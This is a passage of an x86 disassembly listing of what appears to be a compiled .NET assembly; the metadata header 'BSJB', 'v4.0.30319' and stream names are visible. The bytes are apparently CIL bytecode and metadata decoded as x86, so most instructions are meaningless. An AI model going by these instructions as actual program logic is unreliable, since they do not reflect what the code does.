  40313a:	25 2d 04 26 14       	and    $0x1426042d,%eax
  40313f:	2b 05 6f 5b 00 00    	sub    0x5b6f,%eax
  403145:	0a 25 2d 06 26 72    	or     0x7226062d,%ah
  40314b:	ed                   	in     (%dx),%eax
  40314c:	72 00                	jb     0x40314e
  40314e:	70 72                	jo     0x4031c2
  403150:	01 73 00             	add    %esi,0x0(%ebx)
  403153:	70 6f                	jo     0x4031c4
  403155:	30 00                	xor    %al,(%eax)
  403157:	00 0a                	add    %cl,(%edx)
  403159:	2d 07 72 09 73       	sub    $0x73097207,%eax
  40315e:	00 70 2b             	add    %dh,0x2b(%eax)
  403161:	05 72 1d 73 00       	add    $0x731d72,%eax
  403166:	70 0d                	jo     0x403175
  403168:	1c 8d                	sbb    $0x8d,%al
  40316a:	36 00 00             	add    %al,%ss:(%eax)
  40316d:	01 25 16 72 37 73    	add    %esp,0x73377216
  403173:	00 70 a2             	add    %dh,-0x5e(%eax)
  403176:	25 17 08 a2 25       	and    $0x25a20817,%eax
  40317b:	18 72 57             	sbb    %dh,0x57(%edx)
  40317e:	73 00                	jae    0x403180
  403180:	70 a2                	jo     0x403124
  403182:	25 19 07 a2 25       	and    $0x25a20719,%eax
  403187:	1a 72 57             	sbb    0x57(%edx),%dh
  40318a:	73 00                	jae    0x40318c
  40318c:	70 a2                	jo     0x403130
  40318e:	25 1b 09 a2 28       	and    $0x28a2091b,%eax
  403193:	5c                   	pop    %esp
  403194:	00 00                	add    %al,(%eax)
  403196:	0a 26                	or     (%esi),%ah
  403198:	06                   	push   %es
  403199:	25 2d 06 26 72       	and    $0x7226062d,%eax
  40319e:	29 01                	sub    %eax,(%ecx)
  4031a0:	00 70 13             	add    %dh,0x13(%eax)
  4031a3:	04 02                	add    $0x2,%al
  4031a5:	7b 07                	jnp    0x4031ae
  4031a7:	00 00                	add    %al,(%eax)
  4031a9:	04 11                	add    $0x11,%al
  4031ab:	04 6f                	add    $0x6f,%al
  4031ad:	5d                   	pop    %ebp
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	0a 02                	or     (%edx),%al
  4031b2:	7b 08                	jnp    0x4031bc
  4031b4:	00 00                	add    %al,(%eax)
  4031b6:	04 17                	add    $0x17,%al
  4031b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4031b9:	5e                   	pop    %esi
  4031ba:	00 00                	add    %al,(%eax)
  4031bc:	0a 02                	or     (%edx),%al
  4031be:	7b 09                	jnp    0x4031c9
  4031c0:	00 00                	add    %al,(%eax)
  4031c2:	04 17                	add    $0x17,%al
  4031c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c5:	5e                   	pop    %esi
  4031c6:	00 00                	add    %al,(%eax)
  4031c8:	0a 28                	or     (%eax),%ch
  4031ca:	12 00                	adc    (%eax),%al
  4031cc:	00 06                	add    %al,(%esi)
  4031ce:	de 23                	fisubs (%ebx)
  4031d0:	13 06                	adc    (%esi),%eax
  4031d2:	72 5b                	jb     0x40322f
  4031d4:	73 00                	jae    0x4031d6
  4031d6:	70 11                	jo     0x4031e9
  4031d8:	06                   	push   %es
  4031d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031da:	5f                   	pop    %edi
  4031db:	00 00                	add    %al,(%eax)
  4031dd:	0a 28                	or     (%eax),%ch
  4031df:	47                   	inc    %edi
  4031e0:	00 00                	add    %al,(%eax)
  4031e2:	0a 72 97             	or     -0x69(%edx),%dh
  4031e5:	73 00                	jae    0x4031e7
  4031e7:	70 16                	jo     0x4031ff
  4031e9:	1f                   	pop    %ds
  4031ea:	10 28                	adc    %ch,(%eax)
  4031ec:	60                   	pusha
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a 26                	or     (%esi),%ah
  4031f1:	de 00                	fiadds (%eax)
  4031f3:	2a 41 1c             	sub    0x1c(%ecx),%al
	...
  4031fe:	00 00                	add    %al,(%eax)
  403200:	0c 01                	or     $0x1,%al
  403202:	00 00                	add    %al,(%eax)
  403204:	0c 01                	or     $0x1,%al
  403206:	00 00                	add    %al,(%eax)
  403208:	23 00                	and    (%eax),%eax
  40320a:	00 00                	add    %al,(%eax)
  40320c:	2f                   	das
  40320d:	00 00                	add    %al,(%eax)
  40320f:	01 da                	add    %ebx,%edx
  403211:	02 7b 07             	add    0x7(%ebx),%bh
  403214:	00 00                	add    %al,(%eax)
  403216:	04 6f                	add    $0x6f,%al
  403218:	61                   	popa
  403219:	00 00                	add    %al,(%eax)
  40321b:	0a 28                	or     (%eax),%ch
  40321d:	62 00                	bound  %eax,(%eax)
  40321f:	00 0a                	add    %cl,(%edx)
  403221:	2d 23 02 7b 07       	sub    $0x77b0223,%eax
  403226:	00 00                	add    %al,(%eax)
  403228:	04 6f                	add    $0x6f,%al
  40322a:	61                   	popa
  40322b:	00 00                	add    %al,(%eax)
  40322d:	0a 28                	or     (%eax),%ch
  40322f:	63 00                	arpl   %eax,(%eax)
  403231:	00 0a                	add    %cl,(%edx)
  403233:	72 a3                	jb     0x4031d8
  403235:	73 00                	jae    0x403237
  403237:	70 72                	jo     0x4032ab
  403239:	d7                   	xlat   %ds:(%ebx)
  40323a:	73 00                	jae    0x40323c
  40323c:	70 16                	jo     0x403254
  40323e:	1f                   	pop    %ds
  40323f:	40                   	inc    %eax
  403240:	28 60 00             	sub    %ah,0x0(%eax)
  403243:	00 0a                	add    %cl,(%edx)
  403245:	26 2a da             	es sub %dl,%bl
  403248:	02 7b 07             	add    0x7(%ebx),%bh
  40324b:	00 00                	add    %al,(%eax)
  40324d:	04 6f                	add    $0x6f,%al
  40324f:	61                   	popa
  403250:	00 00                	add    %al,(%eax)
  403252:	0a 28                	or     (%eax),%ch
  403254:	62 00                	bound  %eax,(%eax)
  403256:	00 0a                	add    %cl,(%edx)
  403258:	2d 23 73 64 00       	sub    $0x647323,%eax
  40325d:	00 0a                	add    %cl,(%edx)
  40325f:	25 02 7b 07 00       	and    $0x77b02,%eax
  403264:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403267:	61                   	popa
  403268:	00 00                	add    %al,(%eax)
  40326a:	0a 6f 65             	or     0x65(%edi),%ch
  40326d:	00 00                	add    %al,(%eax)
  40326f:	0a 25 17 6f 66 00    	or     0x666f17,%ah
  403275:	00 0a                	add    %cl,(%edx)
  403277:	28 67 00             	sub    %ah,0x0(%edi)
  40327a:	00 0a                	add    %cl,(%edx)
  40327c:	26 2a 00             	sub    %es:(%eax),%al
  40327f:	00 13                	add    %dl,(%ebx)
  403281:	30 02                	xor    %al,(%edx)
  403283:	00 24 00             	add    %ah,(%eax,%eax,1)
  403286:	00 00                	add    %al,(%eax)
  403288:	0c 00                	or     $0x0,%al
  40328a:	00 11                	add    %dl,(%ecx)
  40328c:	02 7b 0a             	add    0xa(%ebx),%bh
  40328f:	00 00                	add    %al,(%eax)
  403291:	04 2c                	add    $0x2c,%al
  403293:	01 2a                	add    %ebp,(%edx)
  403295:	02 17                	add    (%edi),%dl
  403297:	7d 0a                	jge    0x4032a3
  403299:	00 00                	add    %al,(%eax)
  40329b:	04 72                	add    $0x72,%al
  40329d:	e5 73                	in     $0x73,%eax
  40329f:	00 70 18             	add    %dh,0x18(%eax)
  4032a2:	73 52                	jae    0x4032f6
  4032a4:	00 00                	add    %al,(%eax)
  4032a6:	0a 0a                	or     (%edx),%cl
  4032a8:	02 06                	add    (%esi),%al
  4032aa:	28 68 00             	sub    %ch,0x0(%eax)
  4032ad:	00 0a                	add    %cl,(%edx)
  4032af:	2a 13                	sub    (%ebx),%dl
  4032b1:	30 03                	xor    %al,(%ebx)
  4032b3:	00 e2                	add    %ah,%dl
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	00 00                	add    %al,(%eax)
  4032b9:	00 00                	add    %al,(%eax)
  4032bb:	00 03                	add    %al,(%ebx)
  4032bd:	17                   	pop    %ss
  4032be:	59                   	pop    %ecx
  4032bf:	45                   	inc    %ebp
  4032c0:	08 00                	or     %al,(%eax)
  4032c2:	00 00                	add    %al,(%eax)
  4032c4:	05 00 00 00 12       	add    $0x12000000,%eax
  4032c9:	00 00                	add    %al,(%eax)
  4032cb:	00 1f                	add    %bl,(%edi)
  4032cd:	00 00                	add    %al,(%eax)
  4032cf:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	39 00                	cmp    %eax,(%eax)
  4032d6:	00 00                	add    %al,(%eax)
  4032d8:	5d                   	pop    %ebp
  4032d9:	00 00                	add    %al,(%eax)
  4032db:	00 6a 00             	add    %ch,0x0(%edx)
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	8e 00                	mov    (%eax),%es
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	38 ad 00 00 00 02    	cmp    %ch,0x2000000(%ebp)
  4032ea:	04 74                	add    $0x74,%al
  4032ec:	29 00                	sub    %eax,(%eax)
  4032ee:	00 01                	add    %al,(%ecx)
  4032f0:	7d 02                	jge    0x4032f4
  4032f2:	00 00                	add    %al,(%eax)
  4032f4:	04 2a                	add    $0x2a,%al
  4032f6:	02 04 74             	add    (%esp,%esi,2),%al
  4032f9:	29 00                	sub    %eax,(%eax)
  4032fb:	00 01                	add    %al,(%ecx)
  4032fd:	7d 03                	jge    0x403302
  4032ff:	00 00                	add    %al,(%eax)
  403301:	04 2a                	add    $0x2a,%al
  403303:	02 04 74             	add    (%esp,%esi,2),%al
  403306:	29 00                	sub    %eax,(%eax)
  403308:	00 01                	add    %al,(%ecx)
  40330a:	7d 04                	jge    0x403310
  40330c:	00 00                	add    %al,(%eax)
  40330e:	04 2a                	add    $0x2a,%al
  403310:	02 04 74             	add    (%esp,%esi,2),%al
  403313:	2a 00                	sub    (%eax),%al
  403315:	00 01                	add    %al,(%ecx)
  403317:	7d 05                	jge    0x40331e
  403319:	00 00                	add    %al,(%eax)
  40331b:	04 2a                	add    $0x2a,%al
  40331d:	02 04 74             	add    (%esp,%esi,2),%al
  403320:	2b 00                	sub    (%eax),%eax
  403322:	00 01                	add    %al,(%ecx)
  403324:	7d 06                	jge    0x40332c
  403326:	00 00                	add    %al,(%eax)
  403328:	04 02                	add    $0x2,%al
  40332a:	7b 06                	jnp    0x403332
  40332c:	00 00                	add    %al,(%eax)
  40332e:	04 02                	add    $0x2,%al
  403330:	fe 06                	incb   (%esi)
  403332:	17                   	pop    %ss
  403333:	00 00                	add    %al,(%eax)
  403335:	06                   	push   %es
  403336:	73 69                	jae    0x4033a1
  403338:	00 00                	add    %al,(%eax)
  40333a:	0a 6f 6a             	or     0x6a(%edi),%ch
  40333d:	00 00                	add    %al,(%eax)
  40333f:	0a 2a                	or     (%edx),%ch
  403341:	02 04 74             	add    (%esp,%esi,2),%al
  403344:	2c 00                	sub    $0x0,%al
  403346:	00 01                	add    %al,(%ecx)
  403348:	7d 07                	jge    0x403351
  40334a:	00 00                	add    %al,(%eax)
  40334c:	04 2a                	add    $0x2a,%al
  40334e:	02 04 74             	add    (%esp,%esi,2),%al
  403351:	2b 00                	sub    (%eax),%eax
  403353:	00 01                	add    %al,(%ecx)
  403355:	7d 08                	jge    0x40335f
  403357:	00 00                	add    %al,(%eax)
  403359:	04 02                	add    $0x2,%al
  40335b:	7b 08                	jnp    0x403365
  40335d:	00 00                	add    %al,(%eax)
  40335f:	04 02                	add    $0x2,%al
  403361:	fe 06                	incb   (%esi)
  403363:	18 00                	sbb    %al,(%eax)
  403365:	00 06                	add    %al,(%esi)
  403367:	73 69                	jae    0x4033d2
  403369:	00 00                	add    %al,(%eax)
  40336b:	0a 6f 6a             	or     0x6a(%edi),%ch
  40336e:	00 00                	add    %al,(%eax)
  403370:	0a 2a                	or     (%edx),%ch
  403372:	02 04 74             	add    (%esp,%esi,2),%al
  403375:	2b 00                	sub    (%eax),%eax
  403377:	00 01                	add    %al,(%ecx)
  403379:	7d 09                	jge    0x403384
  40337b:	00 00                	add    %al,(%eax)
  40337d:	04 02                	add    $0x2,%al
  40337f:	7b 09                	jnp    0x40338a
  403381:	00 00                	add    %al,(%eax)
  403383:	04 02                	add    $0x2,%al
  403385:	fe 06                	incb   (%esi)
  403387:	19 00                	sbb    %eax,(%eax)
  403389:	00 06                	add    %al,(%esi)
  40338b:	73 69                	jae    0x4033f6
  40338d:	00 00                	add    %al,(%eax)
  40338f:	0a 6f 6a             	or     0x6a(%edi),%ch
  403392:	00 00                	add    %al,(%eax)
  403394:	0a 2a                	or     (%edx),%ch
  403396:	02 17                	add    (%edi),%dl
  403398:	7d 0a                	jge    0x4033a4
  40339a:	00 00                	add    %al,(%eax)
  40339c:	04 2a                	add    $0x2a,%al
  40339e:	1e                   	push   %ds
  40339f:	02 28                	add    (%eax),%ch
  4033a1:	6b 00 00             	imul   $0x0,(%eax),%eax
  4033a4:	0a 2a                	or     (%edx),%ch
  4033a6:	ae                   	scas   %es:(%edi),%al
  4033a7:	7e 0b                	jle    0x4033b4
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	04 2d                	add    $0x2d,%al
  4033ad:	1e                   	push   %ds
  4033ae:	72 51                	jb     0x403401
  4033b0:	74 00                	je     0x4033b2
  4033b2:	70 d0                	jo     0x403384
  4033b4:	05 00 00 02 28       	add    $0x28020000,%eax
  4033b9:	1a 00                	sbb    (%eax),%al
  4033bb:	00 0a                	add    %cl,(%edx)
  4033bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4033be:	6c                   	insb   (%dx),%es:(%edi)
  4033bf:	00 00                	add    %al,(%eax)
  4033c1:	0a 73 6d             	or     0x6d(%ebx),%dh
  4033c4:	00 00                	add    %al,(%eax)
  4033c6:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  4033cc:	7e 0b                	jle    0x4033d9
  4033ce:	00 00                	add    %al,(%eax)
  4033d0:	04 2a                	add    $0x2a,%al
  4033d2:	1a 7e 0c             	sbb    0xc(%esi),%bh
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	04 2a                	add    $0x2a,%al
  4033d9:	1e                   	push   %ds
  4033da:	02 80 0c 00 00 04    	add    0x400000c(%eax),%al
  4033e0:	2a 1a                	sub    (%edx),%bl
  4033e2:	7e 0d                	jle    0x4033f1
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	04 2a                	add    $0x2a,%al
  4033e8:	1e                   	push   %ds
  4033e9:	02 28                	add    (%eax),%ch
  4033eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	0a 2a                	or     (%edx),%ch
  4033f0:	56                   	push   %esi
  4033f1:	73 21                	jae    0x403414
  4033f3:	00 00                	add    %al,(%eax)
  4033f5:	06                   	push   %es
  4033f6:	28 6f 00             	sub    %ch,0x0(%edi)
  4033f9:	00 0a                	add    %cl,(%edx)
  4033fb:	74 06                	je     0x403403
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	02 80 0d 00 00 04    	add    0x400000d(%eax),%al
  403405:	2a 00                	sub    (%eax),%al
  403407:	00 42 53             	add    %al,0x53(%edx)
  40340a:	4a                   	dec    %edx
  40340b:	42                   	inc    %edx
  40340c:	01 00                	add    %eax,(%eax)
  40340e:	01 00                	add    %eax,(%eax)
  403410:	00 00                	add    %al,(%eax)
  403412:	00 00                	add    %al,(%eax)
  403414:	0c 00                	or     $0x0,%al
  403416:	00 00                	add    %al,(%eax)
  403418:	76 34                	jbe    0x40344e
  40341a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40341d:	33 30                	xor    (%eax),%esi
  40341f:	33 31                	xor    (%ecx),%esi
  403421:	39 00                	cmp    %eax,(%eax)
  403423:	00 00                	add    %al,(%eax)
  403425:	00 05 00 6c 00 00    	add    %al,0x6c00
  40342b:	00 a0 13 00 00 23    	add    %ah,0x23000013(%eax)
  403431:	7e 00                	jle    0x403433
  403433:	00 0c 14             	add    %cl,(%esp,%edx,1)
  403436:	00 00                	add    %al,(%eax)
  403438:	50                   	push   %eax
  403439:	12 00                	adc    (%eax),%al
  40343b:	00 23                	add    %ah,(%ebx)
  40343d:	53                   	push   %ebx
  40343e:	74 72                	je     0x4034b2
  403440:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  403447:	00 5c 26 00          	add    %bl,0x0(%esi,%eiz,1)
  40344b:	00 b4 74 00 00 23 55 	add    %dh,0x55230000(%esp,%esi,2)
  403452:	53                   	push   %ebx
  403453:	00 10                	add    %dl,(%eax)
  403455:	9b                   	fwait
  403456:	00 00                	add    %al,(%eax)
  403458:	10 00                	adc    %al,(%eax)
  40345a:	00 00                	add    %al,(%eax)
  40345c:	23 47 55             	and    0x55(%edi),%eax
  40345f:	49                   	dec    %ecx
  403460:	44                   	inc    %esp
  403461:	00 00                	add    %al,(%eax)
  403463:	00 20                	add    %ah,(%eax)
  403465:	9b                   	fwait
  403466:	00 00                	add    %al,(%eax)
  403468:	b4 07                	mov    $0x7,%ah
  40346a:	00 00                	add    %al,(%eax)
  40346c:	23 42 6c             	and    0x6c(%edx),%eax
  40346f:	6f                   	outsl  %ds:(%esi),(%dx)
  403470:	62 00                	bound  %eax,(%eax)
  403472:	00 00                	add    %al,(%eax)
  403474:	00 00                	add    %al,(%eax)
  403476:	00 00                	add    %al,(%eax)
  403478:	02 00                	add    (%eax),%al
  40347a:	00 01                	add    %al,(%ecx)
  40347c:	57                   	push   %edi
  40347d:	17                   	pop    %ss
  40347e:	a2 1f 09 0b 00       	mov    %al,0xb091f
  403483:	00 00                	add    %al,(%eax)
  403485:	fa                   	cli
  403486:	01 33                	add    %esi,(%ebx)
  403488:	00 16                	add    %dl,(%esi)
  40348a:	00 00                	add    %al,(%eax)
  40348c:	01 00                	add    %eax,(%eax)
  40348e:	00 00                	add    %al,(%eax)
  403490:	5f                   	pop    %edi
  403491:	00 00                	add    %al,(%eax)
  403493:	00 17                	add    %dl,(%edi)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 31                	add    %dh,(%ecx)
  403499:	00 00                	add    %al,(%eax)
  40349b:	00 56 00             	add    %dl,0x0(%esi)
  40349e:	00 00                	add    %al,(%eax)
  4034a0:	c5 00                	lds    (%eax),%eax
  4034a2:	00 00                	add    %al,(%eax)
  4034a4:	01 00                	add    %eax,(%eax)
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	00 2d 00 00 00 0c    	add    %ch,0xc000000
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	00 02                	add    %al,(%edx)
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	00 03                	add    %al,(%ebx)
  4034b9:	00 00                	add    %al,(%eax)
  4034bb:	00 04 00             	add    %al,(%eax,%eax,1)
  4034be:	00 00                	add    %al,(%eax)
  4034c0:	01 00                	add    %eax,(%eax)
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	01 00                	add    %eax,(%eax)
  4034c6:	00 00                	add    %al,(%eax)
  4034c8:	0b 00                	or     (%eax),%eax
  4034ca:	00 00                	add    %al,(%eax)
  4034cc:	03 00                	add    (%eax),%eax
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	01 00                	add    %eax,(%eax)
  4034d2:	00 00                	add    %al,(%eax)
  4034d4:	07                   	pop    %es
  4034d5:	00 00                	add    %al,(%eax)
  4034d7:	00 02                	add    %al,(%edx)
  4034d9:	00 00                	add    %al,(%eax)
  4034db:	00 11                	add    %dl,(%ecx)
  4034dd:	00 00                	add    %al,(%eax)
  4034df:	00 01                	add    %al,(%ecx)
  4034e1:	00 00                	add    %al,(%eax)
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	00 6f 08             	add    %ch,0x8(%edi)
  4034e8:	01 00                	add    %eax,(%eax)
  4034ea:	00 00                	add    %al,(%eax)
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	06                   	push   %es
  4034ef:	00 6e 07             	add    %ch,0x7(%esi)
  4034f2:	89 0d 06 00 db 07    	mov    %ecx,0x7db0006
  4034f8:	89 0d 06 00 44 06    	mov    %ecx,0x6440006
  4034fe:	4f                   	dec    %edi
  4034ff:	0d 0f 00 1b 0e       	or     $0xe1b000f,%eax
  403504:	00 00                	add    %al,(%eax)
  403506:	06                   	push   %es
  403507:	00 85 06 16 0b 06    	add    %al,0x60b1606(%ebp)
  40350d:	00 1c 07             	add    %bl,(%edi,%eax,1)
  403510:	16                   	push   %ss
  403511:	0b 06                	or     (%esi),%eax
  403513:	00 fd                	add    %bh,%ch
  403515:	06                   	push   %es
  403516:	16                   	push   %ss
  403517:	0b 06                	or     (%esi),%eax
  403519:	00 c2                	add    %al,%dl
  40351b:	07                   	pop    %es
  40351c:	16                   	push   %ss
  40351d:	0b 06                	or     (%esi),%eax
  40351f:	00 8e 07 16 0b 06    	add    %cl,0x60b1607(%esi)
  403525:	00 a7 07 16 0b 06    	add    %ah,0x60b1607(%edi)
  40352b:	00 9c 06 16 0b 06 00 	add    %bl,0x60b16(%esi,%eax,1)
  403532:	71 06                	jno    0x40353a
  403534:	6a 0d                	push   $0xd
  403536:	0a 00                	or     (%eax),%al
  403538:	bc 0a f4 0f 0a       	mov    $0xa0ff40a,%esp
  40353d:	00 39                	add    %bh,(%ecx)
  40353f:	07                   	pop    %es
  403540:	f4                   	hlt
  403541:	0f 06                	clts
  403543:	00 e0                	add    %ah,%al
  403545:	06                   	push   %es
  403546:	16                   	push   %ss
  403547:	0b 06                	or     (%esi),%eax
  403549:	00 b7 06 cf 08 06    	add    %dh,0x608cf06(%edi)
  40354f:	00 0b                	add    %cl,(%ebx)
  403551:	10 56 0a             	adc    %dl,0xa(%esi)
  403554:	06                   	push   %es
  403555:	00 f9                	add    %bh,%cl
  403557:	03 56 0a             	add    0xa(%esi),%edx
  40355a:	06                   	push   %es
  40355b:	00 c9                	add    %cl,%cl
  40355d:	02 56 0a             	add    0xa(%esi),%dl
  403560:	06                   	push   %es
  403561:	00 f6                	add    %dh,%dh
  403563:	0c 82                	or     $0x82,%al
  403565:	0f 06                	clts
  403567:	00 04 02             	add    %al,(%edx,%eax,1)
  40356a:	56                   	push   %esi
  40356b:	0a 06                	or     (%esi),%al
  40356d:	00 3e                	add    %bh,(%esi)
  40356f:	0b 6a 0d             	or     0xd(%edx),%ebp
  403572:	06                   	push   %es
  403573:	00 4c 07 6a          	add    %cl,0x6a(%edi,%eax,1)
  403577:	0d 06 00 39 05       	or     $0x5390006,%eax
  40357c:	56                   	push   %esi
  40357d:	0a 06                	or     (%esi),%al
  40357f:	00 ac 10 56 0a 06 00 	add    %ch,0x60a56(%eax,%edx,1)
  403586:	6b 09 56             	imul   $0x56,(%ecx),%ecx
  403589:	0a 06                	or     (%esi),%al
  40358b:	00 ec                	add    %ch,%ah
  40358d:	03 56 0a             	add    0xa(%esi),%edx
  403590:	06                   	push   %es
  403591:	00 67 10             	add    %ah,0x10(%edi)
  403594:	6a 0d                	push   $0xd
  403596:	06                   	push   %es
  403597:	00 f5                	add    %dh,%ch
  403599:	05 89 0d 0e 00       	add    $0xe0d89,%eax
  40359e:	3f                   	aas
  40359f:	00 89 0d 06 00 95    	add    %cl,-0x6afff9f3(%ecx)
  4035a5:	00 56 0a             	add    %dl,0xa(%esi)
  4035a8:	0e                   	push   %cs
  4035a9:	00 c3                	add    %al,%bl
  4035ab:	05 89 0d 06 00       	add    $0x60d89,%eax
  4035b0:	87 00                	xchg   %eax,(%eax)
  4035b2:	56                   	push   %esi
  4035b3:	0a 06                	or     (%esi),%al
  4035b5:	00 bd 02 82 0f 0a    	add    %bh,0xa0f8202(%ebp)
  4035bb:	00 b0 0a f4 0f 06    	add    %dh,0x60ff40a(%eax)
  4035c1:	00 27                	add    %ah,(%edi)
  4035c3:	06                   	push   %es
  4035c4:	4f                   	dec    %edi
  4035c5:	0d 12 00 10 06       	or     $0x6100012,%eax
  4035ca:	a9 0c 06 00 e2       	test   $0xe200060c,%eax
  4035cf:	05 56 0a 0a 00       	add    $0xa0a56,%eax
  4035d4:	9a 11 f4 0f 16 00 30 	lcall  $0x3000,$0x160ff411
  4035db:	0d ea 0b 0a 00       	or     $0xa0bea,%eax
  4035e0:	67 0b 61 0f          	or     0xf(%bx,%di),%esp
  4035e4:	0a 00                	or     (%eax),%al
  4035e6:	c5 11                	lds    (%ecx),%edx
  4035e8:	61                   	popa
  4035e9:	0f 0a                	(bad)
  4035eb:	00 7d 0b             	add    %bh,0xb(%ebp)
  4035ee:	61                   	popa
  4035ef:	0f 0a                	(bad)
  4035f1:	00 ce                	add    %cl,%dh
  4035f3:	11 61 0f             	adc    %esp,0xf(%ecx)
  4035f6:	1a 00                	sbb    (%eax),%al
  4035f8:	44                   	inc    %esp
  4035f9:	0f f4 0f             	pmuludq (%edi),%mm1
  4035fc:	06                   	push   %es
  4035fd:	00 26                	add    %ah,(%esi)
  4035ff:	00 56 0a             	add    %dl,0xa(%esi)
  403602:	06                   	push   %es
  403603:	00 50 0b             	add    %dl,0xb(%eax)
  403606:	56                   	push   %esi
  403607:	0a 12                	or     (%edx),%dl
  403609:	00 67 09             	add    %ah,0x9(%edi)
  40360c:	56                   	push   %esi
  40360d:	0a 12                	or     (%edx),%dl
  40360f:	00 ae 05 07 0a 12    	add    %ch,0x120a0705(%esi)
  403615:	00 58 06             	add    %bl,0x6(%eax)
  403618:	07                   	pop    %es
  403619:	0a 06                	or     (%esi),%al
  40361b:	00 78 0c             	add    %bh,0xc(%eax)
  40361e:	a9 0d 06 00 88       	test   $0x8800060d,%eax
  403623:	0b 01                	or     (%ecx),%eax
  403625:	0b 12                	or     (%edx),%edx
  403627:	00 4e 04             	add    %cl,0x4(%esi)
  40362a:	ec                   	in     (%dx),%al
  40362b:	0a 06                	or     (%esi),%al
  40362d:	00 06                	add    %al,(%esi)
  40362f:	09 56 0a             	or     %edx,0xa(%esi)
  403632:	06                   	push   %es
  403633:	00 10                	add    %dl,(%eax)
  403635:	0d 56 0a 06 00       	or     $0x60a56,%eax
  40363a:	ef                   	out    %eax,(%dx)
  40363b:	02 56 0a             	add    0xa(%esi),%dl
  40363e:	1e                   	push   %ds
  40363f:	00 a2 0b 3d 0c 1e    	add    %ah,0x1e0c3d0b(%edx)
  403645:	00 09                	add    %cl,(%ecx)
  403647:	0f 3d                	(bad)
  403649:	0c 1e                	or     $0x1e,%al
  40364b:	00 64 0c 3d          	add    %ah,0x3d(%esp,%ecx,1)
  40364f:	0c 0e                	or     $0xe,%al
  403651:	00 5c 0c 89          	add    %bl,-0x77(%esp,%ecx,1)
  403655:	0d 1e 00 21 0f       	or     $0xf21001e,%eax
  40365a:	3d 0c 06 00 31       	cmp    $0x3100060c,%eax
  40365f:	00 40 01             	add    %al,0x1(%eax)
  403662:	06                   	push   %es
  403663:	00 8d 0c 4f 0d 06    	add    %cl,0x60d4f0c(%ebp)
  403669:	00 45 0d             	add    %al,0xd(%ebp)
  40366c:	56                   	push   %esi
  40366d:	0a 06                	or     (%esi),%al
  40366f:	00 f1                	add    %dh,%cl
  403671:	09 6a 0d             	or     %ebp,0xd(%edx)
  403674:	06                   	push   %es
  403675:	00 99 05 56 0a 06    	add    %bl,0x60a5605(%ecx)
  40367b:	00 e7                	add    %ah,%bh
  40367d:	10 56 0a             	adc    %dl,0xa(%esi)
  403680:	06                   	push   %es
  403681:	00 33                	add    %dh,(%ebx)
  403683:	11 56 0a             	adc    %edx,0xa(%esi)
  403686:	06                   	push   %es
  403687:	00 0d 08 56 0a 06    	add    %cl,0x60a5608
  40368d:	00 b5 08 59 11 06    	add    %dh,0x6115908(%ebp)
  403693:	00 df                	add    %bl,%bh
  403695:	0c 56                	or     $0x56,%al
  403697:	0a 06                	or     (%esi),%al
  403699:	00 6d 0c             	add    %ch,0xc(%ebp)
  40369c:	56                   	push   %esi
  40369d:	0a 06                	or     (%esi),%al
  40369f:	00 e2                	add    %ah,%dl
  4036a1:	11 56 0a             	adc    %edx,0xa(%esi)
  4036a4:	06                   	push   %es
  4036a5:	00 44 09 13          	add    %al,0x13(%ecx,%ecx,1)
  4036a9:	01 12                	add    %edx,(%edx)
  4036ab:	00 cc                	add    %cl,%ah
  4036ad:	0f 4f 0d 06 00 44 0d 	cmovg  0xd440006,%ecx
  4036b4:	56                   	push   %esi
  4036b5:	0a 0f                	or     (%edi),%cl
  4036b7:	01 28                	add    %ebp,(%eax)
  4036b9:	0c 00                	or     $0x0,%al
  4036bb:	00 06                	add    %al,(%esi)
  4036bd:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  4036c0:	13 01                	adc    (%ecx),%eax
  4036c2:	06                   	push   %es
  4036c3:	00 5d 0a             	add    %bl,0xa(%ebp)
  4036c6:	56                   	push   %esi
  4036c7:	0a 12                	or     (%edx),%dl
  4036c9:	00 09                	add    %cl,(%ecx)
  4036cb:	02 56 0a             	add    0xa(%esi),%dl
  4036ce:	0a 00                	or     (%eax),%al
  4036d0:	5a                   	pop    %edx
  4036d1:	0b d6                	or     %esi,%edx
  4036d3:	0e                   	push   %cs
  4036d4:	0a 00                	or     (%eax),%al
  4036d6:	27                   	daa
  4036d7:	0d d6 0e 0a 00       	or     $0xa0ed6,%eax
  4036dc:	49                   	dec    %ecx
  4036dd:	0a 61 0f             	or     0xf(%ecx),%ah
  4036e0:	0a 00                	or     (%eax),%al
  4036e2:	29 0a                	sub    %ecx,(%edx)
  4036e4:	61                   	popa
  4036e5:	0f 1a 00             	bndldx (%eax),%bnd0
  4036e8:	db 10                	fistl  (%eax)
  4036ea:	f4                   	hlt
  4036eb:	0f 0a                	(bad)
  4036ed:	00 ba 11 f4 0f 0a    	add    %bh,0xa0ff411(%edx)
  4036f3:	00 c3                	add    %al,%bl
  4036f5:	10 f4                	adc    %dh,%ah
  4036f7:	0f 0a                	(bad)
